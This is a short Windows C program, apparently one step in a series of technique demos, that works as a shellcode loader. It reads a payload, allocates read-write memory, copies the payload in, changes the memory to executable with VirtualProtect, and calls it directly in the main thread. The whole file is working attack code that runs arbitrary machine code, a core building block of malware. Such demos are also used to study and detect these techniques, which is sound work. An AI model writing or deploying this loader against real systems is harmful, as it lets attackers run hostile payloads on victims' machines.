#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

int main(int argc, char* argv[]) {
    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    PrintStep(2, "Allocating memory (RW)");
    LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) { PrintError("VirtualAlloc failed"); return 1; }
    printf("[+] Allocated memory at: %p\n", execMem);

    PrintStep(3, "Copying payload");
    memcpy(execMem, payload, payloadSize);
    free(payload);

    PrintStep(4, "Changing memory protection (RW -> RX)");
    DWORD oldProtect;
    VirtualProtect(execMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
    printf("[+] VirtualProtect succeeded, old protect: 0x%lx\n", oldProtect);
    printf("[+] Payload at: %p\n", execMem);

    PrintStep(5, "Executing in Main Thread");
    printf("[+] Executing payload in main thread at: %p\n", execMem);
    ((void(*)())execMem)();

    return 0;
}
